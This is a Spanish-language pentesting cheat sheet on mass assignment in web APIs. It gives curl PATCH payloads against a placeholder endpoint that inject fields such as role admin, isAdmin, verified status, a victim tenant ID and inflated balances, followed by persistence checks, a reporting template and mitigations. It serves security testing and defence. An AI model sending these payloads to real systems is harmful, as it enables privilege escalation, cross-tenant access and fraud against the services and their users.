# Mass Assignment

> Técnica: modificación de campos no expuestos por la UI pero aceptados por el backend.

## Cuándo probar

- La API recibe objetos JSON completos.
- El response devuelve campos que no aparecen en el formulario.
- Existen campos como `role`, `isAdmin`, `status`, `verified`, `balance`, `tenantId`.
- El frontend solo envía algunos campos, pero el backend parece usar un modelo completo.
- Endpoints típicos: `POST /users`, `PATCH /profile`, `PUT /account/{id}`.

## Variables

```bash
export API_URL="https://example.com/api"
export TOKEN="eyJhbGciOi..."
export USER_ID="123"
```

## Request legítima

```bash
curl -i -X PATCH "$API_URL/users/$USER_ID" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data '{"name":"alice","email":"alice@example.com"}'
```

## Payloads rápidos

### Roles / privilegios

```bash
curl -i -X PATCH "$API_URL/users/$USER_ID" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data '{"name":"alice","email":"alice@example.com","role":"admin","isAdmin":true}'
```

### Estado de cuenta

```bash
curl -i -X PATCH "$API_URL/users/$USER_ID" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data '{"verified":true,"status":"active","approved":true}'
```

### Tenant / organización

```bash
curl -i -X PATCH "$API_URL/users/$USER_ID" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data '{"tenantId":"victim-tenant","organizationId":"victim-org"}'
```

### Campos económicos

```bash
curl -i -X PATCH "$API_URL/users/$USER_ID" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data '{"balance":999999,"credit":999999,"discount":100}'
```

## Campos candidatos

```text
id
userId
accountId
customerId
tenantId
organizationId
role
roles
isAdmin
admin
permissions
groups
verified
approved
status
state
enabled
balance
credit
discount
price
owner
```

## Confirmar persistencia

Después de modificar, consultar el recurso:

```bash
curl -i "$API_URL/users/$USER_ID" \
  -H "Authorization: Bearer $TOKEN"
```

Buscar si el campo:

- aparece en el response;
- queda guardado;
- cambia permisos;
- habilita nuevas acciones;
- afecta a otros endpoints.

## Qué buscar

| Señal | Interpretación |
|---|---|
| Campo aceptado y persistido | Posible mass assignment |
| Campo aceptado pero no cambia nada | Revisar impacto |
| Error menciona campo interno | Campo reconocido por backend |
| Aparece nueva funcionalidad | Impacto potencial alto |
| Cambia rol/estado/permisos | Hallazgo crítico o alto |

## Evidencia mínima

```text
Endpoint:
Método:
Usuario:
Request legítima:
Request modificada:
Campo añadido:
Response:
Persistencia:
Impacto:
```

## Falsos positivos

- El campo se refleja pero no se guarda.
- El usuario tenía permiso legítimo para modificarlo.
- El campo no afecta a lógica ni permisos.
- El entorno es mock o usa datos no persistentes.
- El backend ignora el campo aunque lo devuelva.

## Mitigación

- Usar allowlist de campos modificables.
- No enlazar directamente modelos internos a objetos de request.
- Separar DTOs de entrada y entidades internas.
- Validar permisos por campo sensible.
- Rechazar campos desconocidos.